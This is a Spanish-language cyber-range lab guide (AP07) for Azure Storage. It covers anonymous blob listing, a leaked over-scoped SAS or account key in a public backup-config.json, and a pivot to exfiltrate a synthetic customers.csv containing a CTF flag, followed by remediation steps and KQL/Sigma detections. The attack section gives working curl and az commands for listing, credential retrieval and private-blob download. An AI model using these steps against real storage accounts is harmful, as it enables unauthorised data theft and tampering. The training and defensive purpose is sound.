# AP07 — Storage público anónimo → SAS over-scoped filtrada → exfiltración del contenedor privado

- **Capa:** Azure (Storage — plano de datos de blobs)
- **Coste:** **~0 — de las rutas de infraestructura Azure (ARM) más baratas del range (empata con AP08).** Storage account **sin cómputo / SIN VM** + unos KB de blobs (céntimos) + ingesta de `StorageBlobLogs` muy por debajo de 0,1 GB/día (céntimos/mes, 31 d de retención incluidos). `./caelum.ps1 destroy` o `reset` → 0. Es la **primera ruta que despliega recursos Azure (ARM) sin facturar cómputo**: las *identity-only* AP01/AP03/AP04 son Entra puro (gratis, sin ARM) y AP02/AP05 sí despliegan ARM, pero **con VM**.
- **MITRE ATT&CK:** [T1530](https://attack.mitre.org/techniques/T1530/) (Data from Cloud Storage — *primario*) · [T1619](https://attack.mitre.org/techniques/T1619/) (Cloud Storage Object Discovery) · [T1552.001](https://attack.mitre.org/techniques/T1552/001/) (Unsecured Credentials: Credentials In Files)
- **Mapea a cert:** CARTP (plano de almacenamiento de Azure; exfiltración de datos)
- **Precondición sembrada por el range** (100% Terraform, `enable_ap07 = true`):
  - Storage account `caelumap07<rand>` (output `ap07_storage_account`) con **doble puerta de acceso anónimo abierta a propósito**:
    1. **a nivel de cuenta** — `allow_nested_items_to_be_public = true`. Es el **inverso exacto** del bloque seguro `azurerm_storage_account.dsc` del módulo `hybrid-ad` (que la fija a `false`) → mismo `account_tier`/`replication`/`min_tls_version = "TLS1_2"`, solo invertida la propiedad de acceso público.
    2. **a nivel de contenedor** — el contenedor `public` con `container_access_type = "container"` (permite **LISTAR** blobs de forma anónima, no solo leerlos).
  - Contenedor público `public` con el artefacto filtrado `backup-config.json`, que incrusta una **credencial sobre-permisionada** hacia el contenedor privado de la **misma cuenta**. Por defecto (`leak_mode = "sas"`) es una **SAS de cuenta over-scoped y de larga vida** (hasta `sas_expiry_years`, por defecto **10 años**); conmutable a `leak_mode = "account_key"`, donde lo filtrado es la `primary_access_key` cruda (control total de la cuenta).
  - Contenedor privado `sensitive-data` (`container_access_type = "private"`) con la **joya**: `customers.csv`, PII **100% sintética** más la flag `CAELUM{ap07_public_blob_to_sas_to_private_exfil}`.
  - Telemetría del **plano de datos**: un `azurerm_monitor_diagnostic_setting` (`caelum-ap07-blob-diag`) sobre `.../blobServices/default` → tabla `StorageBlobLogs` en `caelum-ap07-law` (output `ap07_law_name`) o en un Sentinel externo (`existing_log_analytics_workspace_id`); gated por `collect_storage_logs` (default `true`).
  - **100% declarativo: sin `seed-ap07.ps1`, sin `az vm run-command`, sin hook post-apply** — enteramente cableado por Terraform, **credencial filtrada incluida** (incrustada vía `source_content`): comparte esta propiedad con AP02/AP03/AP04 y se distingue de AP01/AP05, que siembran su *payload* con scripts imperativos (`seed-ap01.ps1` / `seed-ap05.ps1`). **Lo que NO se siembra:** ninguna acción de atacante fuera del estado (a diferencia de AP02).

> **Aviso — la credencial aterriza en el `tfstate`.** El `source_content` del blob filtrado, y —en modo SAS— `data.azurerm_storage_account_sas` + `primary_connection_string` (o, en modo account_key, `primary_access_key` **+** `primary_connection_string`, ambos incrustados en el blob), viven en el estado de Terraform **en claro y marcados como sensibles**. Trata el `tfstate` como **tóxico**, igual que el *client secret* del SP en AP02 o `dc_admin_password` en AP05. El `.gitignore` del repo ya bloquea `*.tfstate*`.

---

## 🎯 Objetivo didáctico

Que el alumno interiorice que **el acceso anónimo a blobs no es un fallo binario sino una puerta doble**, y que **un secreto en reposo dentro de un artefacto público convierte una fuga de lectura en una toma del plano de datos completo**. El escenario demuestra la cadena canónica de CARTP en el *storage plane*: `enumeración anónima → descarga de un config filtrado → credencial over-scoped → pivote autenticado al contenedor privado → exfiltración (y, si la credencial trae escritura, manipulación)`.

El eje conceptual son **dos condiciones simultáneas e independientes**, ninguna suficiente por sí sola:

- **`allow_nested_items_to_be_public = true` (cuenta)** — el *master switch*. Desde ~noviembre de 2023 su valor por defecto para cuentas nuevas es `false`, de modo que **el range debe ponerlo explícitamente a `true`** o la cuenta no sería vulnerable aunque el contenedor fuera `container`.
- **`container_access_type = "container"` (contenedor)** — habilita el **LISTADO** anónimo (`?restype=container&comp=list`), no solo la lectura. Es lo que permite el *descubrimiento* (T1619) sin adivinar el nombre del blob.

**Rompe cualquiera de las dos y la cadena muere** — por eso 🟢 ofrece cortes independientes (defensa en profundidad, en espejo de las cinco condiciones de ESC1 en AP05).

La segunda lección es de **least-privilege**: lo que se filtra en el mundo real dentro de ficheros de config, bundles JS o repos de GitHub **no suele ser la clave de cuenta cruda, sino tokens SAS y connection strings** sobre-permisionados y de larga vida. Una **SAS de cuenta mal-scopeada** es la causa #1 real de brechas de storage. El antídoto correcto no es "quitar la SAS" sino **user-delegation SAS** respaldada por Entra (mínima, revocable sin rotar la clave) — ver 🟢.

> **Bifurcación `leak_mode` (switchable por diseño).** El range mantiene `leak_mode` como variable (`"sas"` por defecto, `"account_key"` como *fallback* validado). **SAS** enseña el ángulo least-privilege y el caveat de fidelidad "la firma de la SAS no viaja en el log". **Account key** es más severa (clave = control total: todos los contenedores, escribir, borrar, regenerar) y su antídoto es `shared_access_key_enabled = false`. En **ambos** modos la credencial aterriza en el `tfstate`.

**Contraste con AP02/AP05 — tres rasgos de diseño:** (1) **100% declarativa**, credencial filtrada incluida (incrustada vía `source_content`), sin la acción imperativa de post-despliegue de AP01/AP05 (`seed-ap01.ps1` / `seed-ap05.ps1`) — propiedad que comparte con AP02/AP03/AP04; (2) **primer `azurerm_monitor_diagnostic_setting` del repo** sobre el *plano de datos* (`monitoring.tf` de AP05 usa AMA/DCR, que es para el canal de eventos de una VM Windows, **no** para blobs); (3) **residuo de reset tan limpio como el de AP05** — toda la superficie vulnerable, credencial filtrada incluida, vive en recursos `azurerm` destruibles, sin residuo *out-of-state*.

---

## 🔴 Rompe (cómo se explota)

> Laboratorio de entrenamiento autorizado, en tenant/subscription de test propios. El nombre de cuenta **no es un secreto** ("seguridad por oscuridad"): el sufijo `<rand>` solo evita colisiones y la adivinación trivial. Herramientas públicas de referencia: **curl** (el enumerador anónimo canónico), **az cli** / **azcopy**, **MicroBurst** (`Invoke-EnumerateAzureBlobs`), **Azure Storage Explorer**, buscadores de blobs públicos tipo *Grayhat Warfare*.

La cadena es `LIST anónimo (public) → GET anónimo (backup-config.json) → credencial → GET autenticado (sensitive-data/customers.csv)`. El range da **dos vías** correspondientes a los dos saltos de confianza.

### Vía A — enumeración y descarga **anónimas** (sin credencial alguna)

El acceso anónimo se ejerce con **HTTP plano** (curl / REST), no con `az` (que exige un modo de autenticación). Es justo el punto: *no hace falta identidad*.

```bash
ACCT=caelumap07<rand>        # = terraform output -raw ap07_storage_account

# 1. T1619 — LISTAR el contenedor publico de forma anonima.
#    Funciona solo si  allow_nested_items_to_be_public=true  Y  container_access_type=container.
curl -s "https://${ACCT}.blob.core.windows.net/public?restype=container&comp=list"
#   -> <EnumerationResults ...><Blobs><Blob><Name>backup-config.json</Name>...
#   (el output Terraform ap07_attacker_hint renderiza justo este one-liner, sin secretos)

# 2. T1530 + T1552.001 — DESCARGAR el config filtrado (credencial en reposo en un fichero).
curl -s "$(terraform output -raw ap07_leaked_config_url)"      # = https://${ACCT}.blob.core.windows.net/public/backup-config.json
```

El cuerpo de `backup-config.json` depende de `leak_mode`:

```jsonc
// leak_mode = "sas"  (por defecto)
{
  "storageAccount": "caelumap07<rand>",
  "container":      "sensitive-data",
  "sasUrl":         "https://caelumap07<rand>.blob.core.windows.net/sensitive-data?sv=2023-11-03&ss=b&srt=sco&sp=rwdlacuptf&se=2035-11-15T00:00:00Z&spr=https&sig=<base64...>",
  "note":           "nightly backup job connection - rotate before prod"
}
// leak_mode = "account_key"  (el blob incrusta clave + connection string)
{ "storageAccount": "caelumap07<rand>", "accountKey": "<primary key base64>", "connectionString": "DefaultEndpointsProtocol=https;AccountName=caelumap07<rand>;AccountKey=<primary key base64>;EndpointSuffix=core.windows.net", "note": "nightly backup job connection - rotate before prod" }
```

> **Caveat — `blob` vs `container` es *load-bearing*.** Con `container_access_type = "blob"` un anónimo puede **leer** un blob *si adivina su nombre*, pero **no listar**. El lab usa `"container"` a propósito para que el descubrimiento (T1619) **no** dependa de adivinar `backup-config.json`: el `?comp=list` lo revela.

> **Caveat — el `.sas` no lleva `?` inicial.** La propiedad `sas` de `azurerm_storage_account_sas` empieza en `sv=...`, no en `?sv=...`. Por eso el `sasUrl` del blob filtrado se construye como `https://<host>/sensitive-data?${sas}` (el `?` lo pone la plantilla). El atacante la usa tal cual.

### Vía B — pivote **autenticado** al contenedor privado (la joya)

La credencial extraída de `backup-config.json` abre `sensitive-data`, que **no** es listable anónimamente.

```bash
# leak_mode = "sas" : la SAS sobre-scopeada (sp=rwdlacuptf -> r/w/d/l/a/c/u/p +t/f en TODA la
#   cuenta; tag(t)/filter(f) los exige el schema del data source azurerm_storage_account_sas)
SAS='sv=2023-11-03&ss=b&srt=sco&sp=rwdlacuptf&se=2035-11-15T00:00:00Z&spr=https&sig=<base64...>'

# Listar el contenedor privado (ya con firma) y bajar la joya:
curl -s "https://${ACCT}.blob.core.windows.net/sensitive-data?restype=container&comp=list&${SAS}"
curl -s "https://${ACCT}.blob.core.windows.net/sensitive-data/customers.csv?${SAS}"
#   -> ...,CAELUM{ap07_public_blob_to_sas_to_private_exfil}

# Equivalente con az usando el token SAS:
az storage blob download --account-name "$ACCT" --container-name sensitive-data \
  --name customers.csv --sas-token "$SAS" -o tsv
```

```bash
# leak_mode = "account_key" : la clave da control TOTAL de la cuenta.
KEY='<primary key base64>'
az storage blob download --account-name "$ACCT" --container-name sensitive-data \
  --name customers.csv --account-key "$KEY" -o tsv
```

> **Rama de escalada / manipulación.** La SAS de cuenta over-scoped incluye `w`/`d`/`c` (y la clave, todo): el atacante no solo **lee** `customers.csv` sino que puede **sobrescribir o borrar** cualquier blob de cualquier contenedor de la cuenta (envenenamiento de artefactos de backup / *supply-chain*). La exfiltración es el objetivo primario (T1530); la escritura es el *bonus* que justifica tratar la fuga como control total, no como "solo lectura".

---

## 🟢 Arregla (remediación)

Las dos primeras cortan la cadena **cada una por separado** (defensa en profundidad: basta cerrar **una** de las dos puertas). Aplícalas en profundidad.

1. **Cerrar la puerta de CUENTA (antídoto directo + default del reset).** `allow_nested_items_to_be_public = false` — exactamente el valor del bloque seguro `azurerm_storage_account.dsc` y el default de plataforma desde ~nov-2023. Con la cuenta cerrada, el nivel de acceso del contenedor **se ignora**.
   ```bash
   az storage account update -g caelum-ap07-rg -n caelumap07<rand> --allow-blob-public-access false
   ```

2. **Cerrar la puerta de CONTENEDOR.** `container_access_type = "private"` en `public` → el `?restype=container&comp=list` anónimo pasa a `PublicAccessNotPermitted`.
   ```bash
   az storage container set-permission --account-name caelumap07<rand> --name public --public-access off
   ```

3. **Sacar los secretos de los blobs (raíz de T1552.001).** **Nunca** credenciales en ficheros de config. Key Vault + **managed identity** / **workload identity federation** para que el *job* de backup obtenga la credencial en *runtime*, no de un artefacto en reposo.

4. **Si de verdad hace falta una SAS: *user-delegation* SAS respaldada por Entra, mínima.** `az storage blob generate-sas --auth-mode login --as-user` acotada a **solo-lectura, un contenedor/objeto, minutos e IP** + **SAS expiration policy** a nivel de cuenta. Diferencia clave frente a la SAS de cuenta: una user-delegation SAS **se revoca** con `az storage account revoke-delegation-keys` **sin rotar la clave de cuenta**; la account-SAS over-scoped solo se mata **rotando la clave entera** o esperando a que caduque (y aquí caduca dentro de 10 años). Antídoto directo a `leak_mode = "sas"`.

5. **`shared_access_key_enabled = false` → plano de datos SOLO por Entra RBAC** (`Storage Blob Data Reader/Contributor` acotados). Mata de raíz **tanto** la clave de cuenta **como** la SAS de cuenta (ambas se firman con la *shared key*). Antídoto directo a `leak_mode = "account_key"`.
   > **Caveat `[leak_mode=sas]` — incompatibilidad por diseño, no bug.** `data.azurerm_storage_account_sas` **lee la clave**, así que exige `shared_access_key_enabled = true`. Aplicar esta remediación #5 con `enable_ap07 = true` hace **fallar** el *data source* — correcto: el estado seguro es el default y el vulnerable es explícito.

6. **Endurecer transporte y red.** `min_tls_version = "TLS1_2"` (ya en el lab), *https-only*, `public_network_access_enabled = false` + *private endpoints* para sacar el plano de datos de Internet.
   > **Caveat — el transporte seguro NO mitiga la fuga.** El endpoint de blob es `https` igualmente: `min_tls_version`/https-only **no** cierran el acceso *público*. Se mantienen en su valor seguro a propósito para que la lección **aísle la causa** (la vuln es el acceso público, no el transporte).

7. **Plataforma / subscription.** Azure Policy **"Storage account public access should be disallowed"** / `denyPublicBlobAccess` (impide el *drift* a vulnerable en toda la sub) + **Microsoft Defender for Storage** (detección nativa de acceso anónimo inusual y exfiltración).

### Remediación in-place en el range (el ejercicio "Arregla")

A diferencia de AP05, **no hay `seed-ap07.ps1 -Remediate`**: la ruta es 100% declarativa, así que "arreglar in-place" es **editar el atributo** (`allow_nested_items_to_be_public = false`, o `container_access_type = "private"`, o `shared_access_key_enabled = false`) y re-aplicar con `enable_ap07 = true`. El alumno re-lanza la Vía A y comprueba que el `?comp=list` anónimo devuelve `PublicAccessNotPermitted`.

> **Dos niveles de reset — no los confundas.** (1) **In-place / pedagógico:** flip de uno de los atributos vulnerables + `terraform apply` (arriba) → deja la cuenta/telemetría en pie para re-testear ataque y detección contra el estado corregido. (2) **Duro / coste→0:** `./caelum.ps1 reset` re-aplica con `enable_ap07 = false` (`count = 0`) → Terraform **destruye atómicamente** RG + cuenta + ambos contenedores + **el blob filtrado con la credencial** + la SAS + el LAW. Es un reset **tan limpio como el de AP05**, y más que el de AP02/AP03/AP04: a diferencia de AP02 (el *self-grant* del atacante queda **fuera** del estado y hay que limpiarlo a mano), AP07 **no tiene ninguna acción de atacante fuera del estado** → **cero residuo *out-of-state***, coste posterior cero. (AP05 empata en limpieza de reset, pero su plantilla ESC1 se *siembra* con un `run-command` imperativo; AP07 es `azurerm` declarativo de punta a punta, como AP02.)

---

## 🔵 Detecta

Dos planos, dos fuentes, dos naturalezas de telemetría:

- **Plano de datos (la cadena en sí)** → tabla **`StorageBlobLogs`**, que **solo existe si el range provisiona el `diagnostic_setting`** sobre `blobServices/default` (`log_analytics_destination_type = "Dedicated"` → tabla *resource-specific*, esquema rico: `AuthenticationType`, `OperationName`, `Uri`, `CallerIpAddress`, `StatusCode`, `RequesterObjectId`). Gated por `collect_storage_logs`.
- **Plano de gestión (el *misconfig*)** → tabla **`AzureActivity`**, que **fluye al SIEM por defecto sin provisionar nada** (como el management-plane de AP02).

| Señal | Tabla | Qué mirar |
|---|---|---|
| Enumeración anónima (T1619) | `StorageBlobLogs` | `AuthenticationType == "Anonymous"` + `OperationName == "ListBlobs"` sobre `public` = el `?restype=container&comp=list` del paso 1 |
| Descarga anónima de la credencial (T1530/T1552.001) | `StorageBlobLogs` | `AuthenticationType == "Anonymous"` + `OperationName in ("GetBlob","GetBlobProperties")` + `Uri has "backup-config.json"` |
| **Pivote** autenticado al contenedor privado (T1530) | `StorageBlobLogs` | `AuthenticationType in ("SAS","Account Key")` + `Uri has "sensitive-data/customers.csv"` desde una `CallerIpAddress` inesperada |
| **Cadena completa (alta fidelidad)** | `StorageBlobLogs` | la **misma `CallerIpAddress`**: `Anonymous`-ListBlobs(`public`) → `Anonymous`-GetBlob(`backup-config.json`) → `SAS/Key`-GetBlob(`sensitive-data`) en ventana corta (~30 m). Casi cero FP: es justo el pivote *public→private* que la remediación hace imposible |
| *Drift* de cuenta a vulnerable | `AzureActivity` | `Microsoft.Storage/storageAccounts/write` con `allowBlobPublicAccess = true` |
| Recuperación de clave | `AzureActivity` | `Microsoft.Storage/storageAccounts/listKeys/action` |
| Contenedor a público | `AzureActivity` | `Microsoft.Storage/storageAccounts/blobServices/containers/write` con `publicAccess in (blob, container)` |

- KQL (Sentinel / Defender XDR): [`detections/kql/AP07-public-storage-leak.kql`](../../detections/kql/AP07-public-storage-leak.kql) — `StorageBlobLogs` (anonymous list/get + pivote SAS/Key + correlación de cadena por `CallerIpAddress`) **y** `AzureActivity` (management-plane).
- Sigma: [`detections/sigma/AP07-public-storage-leak.yml`](../../detections/sigma/AP07-public-storage-leak.yml) — `logsource product: azure, service: activitylogs`.

**Reparto Sigma vs KQL (declarado explícito, como AP02 declaró "AuditEvent del KV no es `activitylogs`" y AP05 "el SAN no viaja").** El **management-plane** (misconfig + `listKeys` + `containers/write`, con filtro de éxito por `status`/`properties.statusCode` igual que AP02) **sí** encaja en un *logsource* Sigma estándar (`azure/activitylogs`). El **data-plane** (`StorageBlobLogs` / acceso anónimo-SAS a blobs) **no es un *logsource* Sigma estándar → es KQL-primary.** No fuerces el acceso anónimo a blobs dentro de una regla `activitylogs`: no está ahí.

> **Caveat — `StorageBlobLogs` NO está activo por defecto.** Sin el `diagnostic_setting` sobre `blobServices/default`, el acceso anónimo **no existe en ningún SIEM** (análogo exacto a "los eventos on-prem no existen sin AMA+DCR" de AP05). Por eso 🔵 solo es testeable *end-to-end* si el range los ingiere (`collect_storage_logs = true`). `AzureActivity` —el misconfig— **sí** fluye sin provisionar.

> **Caveat — los permisos y la firma de la SAS NO se registran.** El log muestra que se usó **una** SAS (`AuthenticationType == "SAS"`) y **desde qué `CallerIpAddress` / hacia qué objeto**, pero **no cuál SAS ni su scope** (eso vive en la firma, no en el log). La correlación es por **IP / tiempo / objeto**, nunca por el contenido de la SAS — misma lección "no AND global" de AP04/AP05, espejo de "el SAN no viaja en 4886/4887". *(Si el pipeline serializa `AuthenticationType` con otra cadena —p.ej. `"Account Key"` vs `"AccountKey"`— ajusta el predicado contra un evento `StorageBlobLogs` real; el fichero KQL es la fuente autoritativa.)*

**Complemento gestionado:** **Microsoft Defender for Storage** trae detección nativa de acceso anónimo inusual y de exfiltración — recomendado junto a estas reglas.

> **Coste de ingesta.** Unos KB de blobs + las operaciones puntuales del ejercicio → `StorageBlobLogs` muy por debajo de 0,1 GB/día → céntimos/mes. Se apaga con `collect_storage_logs = false` (asume SIEM externo). El `metric { category = "Transaction"; enabled = false }` del diagnostic setting evita el *perpetual-diff* conocido cuando la API devuelve el bloque `metric`.

---

## ⚠️ Caveat enseñable — `allowBlobPublicAccess` default = `false` (post-2023)

Al estilo del bloque KB5014754 de AP05: **para cuentas nuevas creadas desde ~noviembre de 2023 el default de plataforma de `allowBlobPublicAccess` es `false`.** Es decir, una cuenta recién creada **no es vulnerable** aunque el contenedor sea `"container"` — el nivel de acceso del contenedor **se ignora** mientras la cuenta no lo permita. Por eso el lab pone `allow_nested_items_to_be_public = true` **explícitamente**: sin ese *opt-in* la ruta "parecería ya parcheada". El bloque seguro `azurerm_storage_account.dsc` del propio repo usa `= false` → **AP07 es su inverso**, lo que de paso confirma el nombre del atributo para `azurerm ~3.116` (renombrado desde `allow_blob_public_access`).

> **Caveat de idempotencia (`[leak_mode=sas]`).** La SAS **no** usa `timestamp()`/`timeadd(timestamp(),…)` para `start`/`expiry`: eso recalcularía la firma HMAC en cada `apply` y re-renderizaría `backup-config.json` (*perpetual-diff*, rompe "deploy dos veces = mismo estado" de `CONTRIBUTING`). En su lugar, `time_static` (fija el `start` una vez, persistido en estado) + `time_offset` (`expiry = start + sas_expiry_years`) producen un token **determinista** → `terraform plan` tras `apply` = *No changes*. Es el motivo técnico que justifica añadir el provider `hashicorp/time ~> 0.12`, en el mismo patrón con que AP05 añadió `hashicorp/archive` para empaquetar la DSC.

---

## 📚 Referencias

- Microsoft — [Prevent anonymous public read access to containers and blobs](https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-prevent) (`allowBlobPublicAccess`; default `false` para cuentas nuevas; precedencia cuenta → contenedor)
- Microsoft — [Configure anonymous read access for containers and blobs](https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure) (`blob` vs `container`: *leer* vs *listar*)
- Microsoft — [Grant limited access with shared access signatures (SAS)](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview) y [Create a user delegation SAS](https://learn.microsoft.com/en-us/azure/storage/blobs/storage-blob-user-delegation-sas-create-cli) (`--auth-mode login --as-user`; `revoke-delegation-keys`; SAS expiration policy)
- Microsoft — [Prevent Shared Key authorization](https://learn.microsoft.com/en-us/azure/storage/common/shared-key-authorization-prevent) (`shared_access_key_enabled = false` → Entra RBAC)
- Microsoft — [Monitor Azure Blob Storage / `StorageBlobLogs`](https://learn.microsoft.com/en-us/azure/storage/blobs/monitor-blob-storage) y [esquema de logs de recurso](https://learn.microsoft.com/en-us/azure/storage/blobs/monitor-blob-storage-reference) (`AuthenticationType`, `OperationName`, `Uri`, `CallerIpAddress`)
- Microsoft — [Overview of Microsoft Defender for Storage](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-storage-introduction)
- NetSPI — **MicroBurst** (`Invoke-EnumerateAzureBlobs`): [github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst)
- MITRE ATT&CK — [T1530](https://attack.mitre.org/techniques/T1530/) (Data from Cloud Storage), [T1619](https://attack.mitre.org/techniques/T1619/) (Cloud Storage Object Discovery), [T1552.001](https://attack.mitre.org/techniques/T1552/001/) (Unsecured Credentials: Credentials In Files)
- Comparar con [AP02](./AP02-managed-identity.md) (plano de gestión por `AzureActivity`, `attacker_hint`, *self-grant* fuera de estado) y [AP05](./AP05-adcs-esc1.md) (riqueza de caveats, reset de dos niveles, precedente del provider `hashicorp/time`/`archive`, lección "la firma no viaja en el log").
